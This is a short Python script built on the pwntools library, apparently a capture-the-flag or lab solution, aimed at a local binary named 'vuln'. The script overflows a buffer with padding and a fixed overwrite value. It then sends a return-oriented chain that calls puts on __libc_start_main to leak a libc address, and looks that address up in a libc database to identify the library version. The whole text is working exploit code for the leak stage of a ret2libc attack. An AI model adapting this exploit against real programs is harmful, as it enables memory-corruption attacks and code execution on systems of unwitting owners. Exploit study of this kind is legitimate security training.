#!/usr/bin/python3
from pwn import *
import subprocess
import re

p = process("./vuln")
elf = ELF("./vuln")
rop = ROP(elf)

PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]

log.info("puts@plt          " + hex(PUTS))
log.info("__libc_start_main " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget    " + hex(POP_RDI))

base = b'A' * 32
overwrite = p64(0xdeadbeefc0ded00d)
rot_chain = p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(PUTS)
payload = base + overwrite + rot_chain


p.sendlineafter("ROP.", payload)
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address,  [__libc_start_main %s]" % hex(leak))

output = subprocess.check_output(['/opt/libc-database/find', '__libc_start_main', hex(leak)])

result = re.search("\(id (.*?)\)", str(output))
log.info("Likely used version of libc: %s" % result.group(1))
	

